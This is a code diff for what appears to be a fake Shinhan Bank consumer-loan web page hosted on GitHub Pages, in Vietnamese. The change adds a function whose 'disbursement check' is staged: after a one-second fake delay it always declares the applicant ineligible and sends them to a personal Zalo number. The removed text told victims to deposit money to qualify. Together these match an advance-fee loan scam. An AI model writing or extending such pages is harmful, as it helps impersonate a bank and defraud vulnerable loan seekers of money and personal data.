@@ -417,13 +417,13 @@
                 </div>
                 <div class="buttons">
                     <button class="primary" onclick="window.location.href='https://vaytieudung.github.io/shinhanbank/pages/vi/step6.html'">HỢP ĐỒNG VAY</button>
-                    <button class="primary" onclick="window.location.href='https://vaytieudung.github.io/shinhanbank/pages/vi/step7.html'">ĐIỀU KIỆN GIẢI NGÂN</button>
+                    <button class="primary" onclick="checkDisbursementCondition()">ĐIỀU KIỆN GIẢI NGÂN</button>
                 </div>
                 <p id="actionSuccess" class="success-message" style="display: none;">Nhận tiền!</p>
             </div>
 
             <div class="buttons">
-                <button class="secondary" onclick="window.location.href='https://vaytieudung.github.io/shinhanbank/'">Trang Chủ</button>
+                <button class="secondary" onclick="window.location.href='https://zalo.me/84762797077'">Hỗ Trợ</button>
             </div>
         </div>
     </div>
@@ -489,9 +489,21 @@
                     console.log('Completion email sent');
                 }, (error) => {
                     console.error('Email sending failed:', error);
-                    alert('Không đủ điều kiện số dư để được giải ngân vui lòng kiểm tra lại hoặc nạp lại vào tài khoản để được xét duyệt lại điều kiện giải ngân');
+                    checkDisbursementCondition();
                 });
         };
+
+        function checkDisbursementCondition() {
+            const successElement = document.getElementById('actionSuccess');
+            successElement.textContent = 'Đang kiểm tra điều kiện giải ngân...';
+            successElement.style.display = 'block';
+
+            setTimeout(() => {
+                alert('Không đủ điều kiện để giải ngân, vui lòng liên hệ đến nhân viên để được xét duyệt và thẩm định điều kiện giải ngân lại');
+                window.location.href = 'http://zalo.me/84762797077';
+                successElement.textContent = 'Đã chuyển hướng đến Zalo!';
+            }, 1000);
+        }
 
         function completeProfile() {
             const successElement = document.getElementById('actionSuccess');
